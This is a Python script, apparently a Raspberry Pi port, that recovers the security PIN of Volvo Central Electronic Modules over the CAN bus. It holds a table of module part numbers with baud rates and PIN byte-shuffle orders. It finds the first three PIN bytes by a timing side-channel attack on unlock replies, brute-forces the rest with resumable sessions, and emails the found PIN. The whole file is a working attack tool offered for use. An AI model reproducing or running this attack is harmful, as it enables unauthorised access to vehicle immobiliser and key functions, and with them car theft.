#!/usr/bin/env python3
import can
import time
import struct
import math
import random
import sys
import os
import json
import smtplib
import threading
import logging
import logging.handlers

# --- Email Notifier ---
class EmailNotifier(threading.Thread):
    def __init__(self, config, cracker_instance):
        super().__init__()
        self.config = config
        self.cracker = cracker_instance
        self.stop_event = threading.Event()
        self.daemon = True

    def send_email(self, subject, body):
        if not all([self.config.get('smtp_server'), self.config.get('smtp_port'), self.config.get('username'), self.config.get('password'), self.config.get('recipient')]):
            logging.warning("Email config incomplete. Skipping email notification.")
            return

        try:
            server = smtplib.SMTP_SSL(self.config['smtp_server'], self.config['smtp_port'])
            server.login(self.config['username'], self.config['password'])
            
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(self.config['username'], self.config['recipient'], message)
            server.quit()
            logging.info(f"Email notification sent: {subject}")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def run(self):
        self.send_email("Volvo Cracker Status", "Cracking process started.")
        
        while not self.stop_event.wait(self.config.get('update_interval', 3600)):
            # This is where you'd fetch the current status from the cracker
            # For now, we'll just send a generic message.
            status_message = "Cracking is in progress."
            self.send_email("Volvo Cracker Status Update", status_message)
            
        self.send_email("Volvo Cracker Status", "Cracking process stopped.")

    def stop(self):
        self.stop_event.set()

# --- CONFIGURATION & CONSTANTS ---

REQ_ID = 0x000FFFFE  # Extended ID for requests
CEM_HS_ID = 0x50     # High Speed CEM Node ID
CEM_LS_ID = 0x40     # Low Speed CEM Node ID

CMD_UNLOCK = 0xBE
CMD_UNLOCK_REPLY = 0xB9

# PIN Shuffling Patterns (from .ino)
# Indexes into the raw PIN array [P0, P1, P2, P3, P4, P5]
SHUFFLE_ORDERS = [
    [0, 1, 2, 3, 4, 5],
    [3, 1, 5, 0, 2, 4],
    [5, 2, 1, 4, 0, 3],
    [2, 4, 5, 0, 3, 1]
]

# Known CEM Configurations (P/N -> (Baud, ShuffleIndex))
BAUD_500K = 500000
BAUD_250K = 250000

CEM_PARAMS = {
    # P1
    8690719: (BAUD_500K, 0), 8690720: (BAUD_500K, 0), 8690721: (BAUD_500K, 0),
    8690722: (BAUD_500K, 0), 30765471: (BAUD_500K, 0), 30728906: (BAUD_500K, 0),
    30765015: (BAUD_500K, 0), 31254317: (BAUD_500K, 0), 31327215: (BAUD_500K, 3),
    31254749: (BAUD_500K, 3), 31254903: (BAUD_500K, 0), 31296881: (BAUD_500K, 3),
    
    # P2 CEM-B (Brick 1999-2004)
    8645716: (BAUD_250K, 0), 8645719: (BAUD_250K, 0), 8688434: (BAUD_250K, 0),
    8688436: (BAUD_250K, 0), 8688513: (BAUD_250K, 2), 30657629: (BAUD_250K, 0),
    9494336: (BAUD_250K, 0), 9494594: (BAUD_250K, 0), 8645171: (BAUD_250K, 0),
    9452553: (BAUD_250K, 0), 8645205: (BAUD_250K, 0), 9452596: (BAUD_250K, 0),
    8602436: (BAUD_250K, 0), 9469809: (BAUD_250K, 0), 8645200: (BAUD_250K, 0),

    # P2 CEM-L (L shaped 2005-2014)
    30682981: (BAUD_500K, 1), 30682982: (BAUD_500K, 1), 30728356: (BAUD_500K, 1),
    30728542: (BAUD_500K, 1), 30765149: (BAUD_500K, 1), 30765646: (BAUD_500K, 1),
    30786475: (BAUD_500K, 1), 30786889: (BAUD_500K, 1), 31282457: (BAUD_500K, 1),
    31314468: (BAUD_500K, 1), 31394158: (BAUD_500K, 1),

    # P2 CEM-H (L shaped H marked 2005-2008)
    30786476: (BAUD_500K, 1), 30728539: (BAUD_500K, 1), 30728357: (BAUD_500K, 1),
    30765148: (BAUD_500K, 1), 30765643: (BAUD_500K, 1), 30795115: (BAUD_500K, 1),
    31282455: (BAUD_500K, 1), 31394157: (BAUD_500K, 1), 30786579: (BAUD_500K, 1),
    30786890: (BAUD_500K, 1) 
}

LOG_FILE = os.getenv("LOG_FILE", "crack.log")
SESSION_FILE = "session.json"

# Pre-calculate BCD table for 0-99
BCD_TABLE = [((val // 10) << 4) | (val % 10) for val in range(100)]

def setup_logging():
    log_path = LOG_FILE
    is_prod = log_path.startswith('/var/log')

    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    
    # Use rotating file handler
    handler = logging.handlers.RotatingFileHandler(
        log_path, 
        maxBytes=10*1024*1024, # 10MB
        backupCount=5
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    # Also log to console for dev environments
    if not is_prod:
        stream_handler = logging.StreamHandler(sys.stdout)
        stream_handler.setFormatter(formatter)
        logger.addHandler(stream_handler)

    logging.info("Logging initialized.")

def bcd_to_bin(val):
    return ((val >> 4) * 10) + (val & 0x0F)

def bin_to_bcd(val):
    # Use lookup if in range, else calc
    if 0 <= val < 100:
        return BCD_TABLE[val]
    return ((val // 10) << 4) | (val % 10)


class VolvoCracker:
    def __init__(self, channel='can0'):
        self.channel = channel
        self.bus = None
        self.cem_pn = 0
        self.baud = 500000
        self.shuffle = SHUFFLE_ORDERS[0]
        self.cem_id = CEM_HS_ID 
        
        # Optimization: Pre-allocate reusable message
        self.tx_msg = can.Message(
            arbitration_id=REQ_ID, 
            data=[0]*8,
            is_extended_id=True,
            check=False # Disable some safety checks for speed
        )

    def setup_can(self, bitrate):
        if self.bus:
            self.bus.shutdown()
        
        logging.info(f"Initializing CAN on {self.channel} @ {bitrate}...")
        try:
            # Add filters to ignore noise
            filters = [
                {"can_id": 0x00000003, "can_mask": 0x1FFFFFFF, "extended": True}, # HS Reply
                {"can_id": 0x00000005, "can_mask": 0x1FFFFFFF, "extended": True}, # LS Reply
                {"can_id": 0x03, "can_mask": 0x7FF, "extended": False},           # Std ID Reply?
            ]
            
            self.bus = can.interface.Bus(
                channel=self.channel, 
                interface='socketcan',
                bitrate=bitrate,
                can_filters=filters
            )
            self.baud = bitrate
            return True
        except Exception as e:
            logging.error(f"Error initializing CAN: {e}")
            return False

    def send_msg(self, arbitration_id, data, is_extended=False):
        # Helper for non-critical messages
        msg = can.Message(arbitration_id=arbitration_id, data=data, is_extended_id=is_extended)
        try:
            self.bus.send(msg)
            return time.time()
        except can.CanError as e:
            logging.error(f"Send Error: {e}")
            return None

    def read_part_number(self):
        """Attempts to read CEM Part Number."""
        # Need to temporarily disable filters or add broadcast filter?
        # For simplicity, we just rely on the existing filters catching the reply (usually 0x00000003)
        
        target_ids = [CEM_HS_ID, CEM_LS_ID]
        
        for tid in target_ids:
            logging.info(f"Attempting to read P/N from Node {hex(tid)}...")
            req = [0xCB, tid, 0xB9, 0xF0, 0x00, 0x00, 0x00, 0x00]
            
            for _ in range(3):
                # Drain
                while self.bus.recv(timeout=0): pass
                
                self.send_msg(REQ_ID, req, is_extended=True)
                
                start = time.time()
                frames = {}
                
                while time.time() - start < 1.0:
                    msg = self.bus.recv(timeout=0.1)
                    if not msg: continue
                    
                    d = msg.data
                    if not d: continue

                    if d[0] & 0x80: 
                        frames[0] = d
                    elif (d[0] & 0x40) == 0: 
                        frames[1] = d
                        
                    if 0 in frames and 1 in frames:
                        f0 = frames[0]
                        f1 = frames[1]
                        
                        pn = 0
                        pn = (pn * 100) + bcd_to_bin(f0[5])
                        pn = (pn * 100) + bcd_to_bin(f0[6])
                        pn = (pn * 100) + bcd_to_bin(f0[7])
                        pn = (pn * 100) + bcd_to_bin(f1[1])
                        
                        logging.info(f"Found Part Number: {pn}")
                        return pn
        return None

    def configure_for_cem(self, pn):
        if pn in CEM_PARAMS:
            baud, shuff_idx = CEM_PARAMS[pn]
            self.baud = baud
            self.shuffle = SHUFFLE_ORDERS[shuff_idx]
            logging.info(f"CEM Configuration: Baud={baud}, Shuffle Index={shuff_idx}")
            return True
        else:
            logging.warning(f"Unknown CEM Part Number: {pn}. Defaulting to P1 settings (500k, Shuffle 0).")
            self.baud = 500000
            self.shuffle = SHUFFLE_ORDERS[0]
            return False

    def check_connection(self):
        """
        Verifies CAN connection and CEM responsiveness.
        Returns: True if ready, False if failure.
        """
        logging.info("Checking CAN connection...")
        
        # 1. Check for Bus Activity (Listen Only)
        logging.info("Listening for traffic (2s)...")
        start = time.time()
        pkt_count = 0
        while time.time() - start < 2.0:
            msg = self.bus.recv(timeout=0.1)
            if msg: pkt_count += 1
            
        if pkt_count == 0:
            logging.error("No traffic on CAN Bus! Check cables/ignition.")
            return False
        else:
            logging.info(f"Traffic detected ({pkt_count} msgs). Bus is active.")
            
        # 2. Ping CEM
        logging.info("Pinging CEM...")
        # Try to read P/N as a ping
        if self.read_part_number():
            logging.info("CEM is responsive.")
            return True
        
        logging.error("Traffic seen, but CEM did not respond to queries.")
        return False

    def unlock_attempt_fast(self, pin_bytes):
        """
        Optimized unlock attempt for Brute Force.
        Returns: True if success, False otherwise.
        """
        # Update reusable message data in place
        d = self.tx_msg.data
        d[0] = self.cem_id
        d[1] = CMD_UNLOCK
        
        # Apply shuffle
        s = self.shuffle
        d[2 + s[0]] = pin_bytes[0]
        d[2 + s[1]] = pin_bytes[1]
        d[2 + s[2]] = pin_bytes[2]
        d[2 + s[3]] = pin_bytes[3]
        d[2 + s[4]] = pin_bytes[4]
        d[2 + s[5]] = pin_bytes[5]
        
        try:
            self.bus.send(self.tx_msg)
        except can.CanError:
            return False

        # Wait for reply
        # Increased timeout to 20ms to be safer
        msg = self.bus.recv(timeout=0.02)
        
        if msg:
            # Filters ensure we only get relevant IDs. Check content.
            # Reply: [CEM_ID, 0xB9, 0x00...]
            if len(msg.data) > 2 and msg.data[1] == CMD_UNLOCK_REPLY and msg.data[2] == 0x00:
                return True
                
        return False

    def unlock_attempt_timing(self, pin_bytes):
        """
        Unlock attempt with timing measurement.
        Returns: (success, latency)
        """
        # Re-use logic but with timestamps
        d = self.tx_msg.data
        d[0] = self.cem_id
        d[1] = CMD_UNLOCK
        s = self.shuffle
        for i in range(6): d[2 + s[i]] = pin_bytes[i]
        
        while self.bus.recv(timeout=0): pass # Drain for precision
        
        try:
            self.bus.send(self.tx_msg)
            t_send = time.time()
        except can.CanError:
            return False, 0

        # Wait longer for timing attack to ensure we catch it? 
        # The latency is the key.
        start = time.time()
        while time.time() - start < 0.1:
            rx = self.bus.recv(timeout=0.02)
            if rx and len(rx.data) > 2 and rx.data[0] == self.cem_id:
                t_recv = rx.timestamp or time.time()
                if rx.data[1] == CMD_UNLOCK_REPLY and rx.data[2] == 0x00:
                    return True, t_recv - t_send
                return False, t_recv - t_send # Return latency even on failure
        
        return False, 0

    def crack_timing(self, known_bytes=0):
        """
        Attempt to find the first few bytes using timing analysis.
        Returns a list of candidate PINs (top probable prefixes).
        """
        logging.info(f"Starting Timing Attack...")
        
        # We want to find bytes 0, 1, 2.
        # Instead of greedy best-first, we keep top N at each stage.
        
        # Start with one empty PIN
        candidates = [[0]*6] 
        
        for pos in range(known_bytes, 3):
            logging.info(f"Analyzing PIN byte {pos} for {len(candidates)} branches...")
            next_stage_candidates = []
            
            for base_pin in candidates:
                stats = {}
                SAMPLES = 25 # Increased samples slightly
                
                # Test all 00-99 values for this position
                for b_val_int in range(100):
                    b_val = BCD_TABLE[b_val_int]
                    current_pin = list(base_pin)
                    current_pin[pos] = b_val
                    
                    total_lat = 0
                    valid_samples = 0
                    
                    for _ in range(SAMPLES):
                        # Randomize next byte for noise averaging
                        if pos + 1 < 6:
                            current_pin[pos+1] = BCD_TABLE[random.randint(0, 99)]
                        
                        suc, lat = self.unlock_attempt_timing(current_pin)
                        if suc:
                            logging.info(f"!!! ACCIDENTAL SUCCESS !!! PIN: {current_pin}")
                            return [current_pin]
                        
                        if lat > 0:
                            total_lat += lat
                            valid_samples += 1
                    
                    if valid_samples > 0:
                        stats[b_val] = total_lat / valid_samples
                
                # Sort by latency (descending)
                sorted_candidates = sorted(stats.items(), key=lambda item: item[1], reverse=True)
                
                # Keep top 3 for this branch
                top_n = sorted_candidates[:3]
                logging.info(f"Top 3 for prefix {base_pin[:pos]}+: {[hex(x[0]) for x in top_n]}")
                
                for byte_val, lat in top_n:
                    new_pin = list(base_pin)
                    new_pin[pos] = byte_val
                    # Reset next bytes
                    if pos + 1 < 6: new_pin[pos+1] = 0
                    if pos + 2 < 6: new_pin[pos+2] = 0
                    next_stage_candidates.append(new_pin)
            
            # Keep overall top 5 to avoid explosion? 
            # Or just keep all expanded branches (3^3 = 27 max). 27 * 1M = 27M. Too much.
            # Let's prune.
            # Actually, the timing score is absolute. We can sort ALL next_stage_candidates by their 'score' 
            # if we propagated score. But here we just have ranks.
            # Strategy: Keep max 5 candidates total per stage?
            
            candidates = next_stage_candidates
            if len(candidates) > 5:
                candidates = candidates[:5] # Prune to top 5 breadth
        
        logging.info(f"Timing Attack Complete. Generated {len(candidates)} candidates.")
        return candidates

    def save_session(self, index, fixed_bytes, candidates_queue=None):
        try:
            state = {
                "timestamp": time.time(),
                "index": index,
                "fixed_bytes": fixed_bytes,
                "candidates_queue": candidates_queue or []
            }
            tmp_file = SESSION_FILE + ".tmp"
            with open(tmp_file, "w") as f:
                json.dump(state, f)
            os.replace(tmp_file, SESSION_FILE)
        except Exception as e:
            pass

    def load_session(self):
        if not os.path.exists(SESSION_FILE):
            return None, None, []
        try:
            with open(SESSION_FILE, "r") as f:
                state = json.load(f)
            idx = state.get("index", 0)
            fixed = state.get("fixed_bytes", [0]*6)
            queue = state.get("candidates_queue", [])
            return max(0, idx - 500), fixed, queue
        except:
            return None, None, []

    def check_power_sag(self):
        """
        Detects if the power rail is dipping (e.g. during engine cranking).
        In simulation: checks for a trigger file.
        In production: could check /sys/class/leds/led1/brightness (Pi Power LED)
        or a dedicated GPIO pin.
        """
        if os.path.exists("POWER_SAG.trigger"):
            return True
        return False

    def brute_force(self, start_pin, start_index=0, candidates_queue=None):
        logging.info(f"Starting Brute Force from index {start_index}...")
        
        current_pin = list(start_pin)
        total = 1000000
        start_t = time.time()
        SAVE_INTERVAL = 2000 
        
        for i in range(start_index, total):
            # --- VOLTAGE SAG / POWER FAIL CHECK ---
            # In a real Swedish winter, cranking can drop voltage.
            # We check a mock file or GPIO to simulate this.
            if self.check_power_sag():
                logging.warning("!!! VOLTAGE SAG DETECTED !!! Pausing for safety...")
                self.save_session(i, start_pin, candidates_queue)
                while self.check_power_sag():
                    time.sleep(1)
                logging.info("Power stabilized. Resuming...")
                start_t = time.time() # Reset rate calc

            # Optimized iteration
            rem = i
            d1, rem = divmod(rem, 10000)
            d2, d3 = divmod(rem, 100)
            
            current_pin[3] = BCD_TABLE[d1]
            current_pin[4] = BCD_TABLE[d2]
            current_pin[5] = BCD_TABLE[d3]
            
            if i % SAVE_INTERVAL == 0:
                elapsed = time.time() - start_t
                rate = (i - start_index) / elapsed if elapsed > 0 else 0
                remaining = total - i
                eta = remaining / rate if rate > 0 else 0
                logging.info(f"Progress: {i}/{total} ({i/total*100:.1f}%) Rate: {rate:.1f}/s ETA: {eta/60:.1f}m - PIN: {current_pin}")
                self.save_session(i, start_pin, candidates_queue)
            
            if self.unlock_attempt_fast(current_pin):
                logging.info(f"\n!!! FOUND PIN: {current_pin} !!!")
                if os.path.exists(SESSION_FILE): os.remove(SESSION_FILE)
                return current_pin
                
        return None

    def run(self):
        # Boost Priority
        try:
            os.nice(-10)
        except:
            pass

        setup_logging()
        logging.info("--- Volvo CEM Cracker (Pi Port Optimized) ---")

        # Load Config
        config = {}
        try:
            with open("config.json", "r") as f:
                config = json.load(f)
        except FileNotFoundError:
            logging.warning("config.json not found. Email notifications disabled.")
        except json.JSONDecodeError:
            logging.error("Error decoding config.json. Email notifications disabled.")

        # Start Email Notifier
        email_notifier = None
        if config.get("email_notifications_enabled"):
            email_notifier = EmailNotifier(config.get("email_settings", {}), self)
            email_notifier.start()

        if not self.setup_can(500000):
            if email_notifier: email_notifier.stop()
            return
            
        if not self.check_connection():
            logging.error("Aborting due to connectivity failure.")
            if email_notifier: email_notifier.stop()
            return

        pn = self.read_part_number()
        if pn: self.configure_for_cem(pn)
        else: logging.warning("Using Defaults.")
        
        resume_index, resume_fixed_bytes, candidates_queue = self.load_session()
        
        current_fixed = None
        
        # Resume Logic
        if resume_index is not None:
            # If previous session was mid-way
            if resume_index < 1000000:
                logging.info(f"Resuming previous candidate from index {resume_index}...")
                current_fixed = [int(x) for x in resume_fixed_bytes]
                final_pin = self.brute_force(current_fixed, start_index=resume_index, candidates_queue=candidates_queue)
                if final_pin:
                    if email_notifier:
                        email_notifier.send_email("PIN Found!", f"The PIN is: {final_pin}")
                        email_notifier.stop()
                    return
            else:
                logging.info("Previous candidate finished. Moving to next...")
        
        # Process Queue
        if not candidates_queue and current_fixed is None:
            logging.info("Generating new candidates via Timing Attack...")
            candidates_queue = self.crack_timing(known_bytes=0)
            if not candidates_queue:
                candidates_queue = [[0]*6] # Fallback
        
        # Iterate through candidates
        while candidates_queue:
            candidate = candidates_queue.pop(0)
            candidate = [int(x) for x in candidate]
            
            logging.info(f"Processing Candidate Prefix: {candidate[:3]}")
            self.save_session(0, candidate, candidates_queue) # Save state before start
            
            final_pin = self.brute_force(candidate, start_index=0, candidates_queue=candidates_queue)
            if final_pin:
                if email_notifier:
                    email_notifier.send_email("PIN Found!", f"The PIN is: {final_pin}")
                    email_notifier.stop()
                return
        
        logging.info("All candidates exhausted. No PIN found.")
        if email_notifier: email_notifier.stop()

if __name__ == "__main__":
    VolvoCracker().run()